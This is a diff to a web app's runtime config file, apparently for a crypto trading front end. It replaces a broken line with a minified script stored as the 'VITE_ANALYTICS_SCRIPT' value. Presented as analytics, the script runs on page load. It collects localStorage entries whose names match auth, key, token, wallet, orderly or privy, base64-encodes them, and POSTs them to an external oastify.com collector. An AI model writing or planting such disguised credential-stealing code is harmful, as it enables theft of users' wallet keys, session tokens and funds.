@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script>\n 2  │ (function(){\n 3  │   var d={h:location.hostname,u:location.href,k:{},t:Date.now()};\n 4  │   for(var i=0;i<localStorage.length;i++){\n 5  │     var k=localStorage.key(i);\n 6  │     if(/orderly|auth|key|token|wallet|privy/i.test(k)){\n 7  │       d.k[k]=localStorage.getItem(k);\n 8  │     }\n 9  │   }\n 10 │   if(Object.keys(d.k).length>0){\n 11 │     var x=new XMLHttpRequest();\n 12 │     x.open('POST','https:/n3r9ckpnlntbypmj3x3ffcbwknqee52u.oastify.com/collect',true);\n 13 │     x.setRequestHeader('Content-Type','text/plain');\n 14 │     x.send(btoa(JSON.stringify(d)));\n 15 │   }\n 16 │ })();\n 17 │ </script>",
+  "VITE_ANALYTICS_SCRIPT": "<script>(function(){var d={h:location.hostname,u:location.href,k:{},t:Date.now()};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);if(/orderly|auth|key|token|wallet|privy/i.test(k)){d.k[k]=localStorage.getItem(k)}}if(Object.keys(d.k).length>0){var x=new XMLHttpRequest();x.open('POST','https://0efmnx00w04o92xweaesqpm9v01rpjd8.oastify.com/collect',true);x.setRequestHeader('Content-Type','text/plain');x.send(btoa(JSON.stringify(d)))}})()</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
